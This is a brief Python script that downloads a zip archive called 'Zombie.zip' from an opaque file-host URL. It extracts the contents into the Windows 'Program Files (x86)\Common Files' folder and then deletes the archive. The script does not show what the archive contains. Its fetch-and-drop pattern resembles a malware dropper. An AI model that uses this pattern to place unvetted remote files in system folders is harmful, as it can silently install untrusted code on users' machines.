import requests
import zipfile
import os

url = 'https://c1029.lanosso.com/de4fe86e3817acfceddf89c1147d4428/66bb4f03/2022/04/29/568824c3c0cd7cb3c807d11946aea9a0.zip?fn=Zombie.zip'
response = requests.get(url)
with open('Zombie.zip', 'wb') as f:
    f.write(response.content)
with zipfile.ZipFile('Zombie.zip', 'r') as zip_ref:
    zip_ref.extractall('C:\\Program Files (x86)\\Common Files')
os.remove('Zombie.zip')
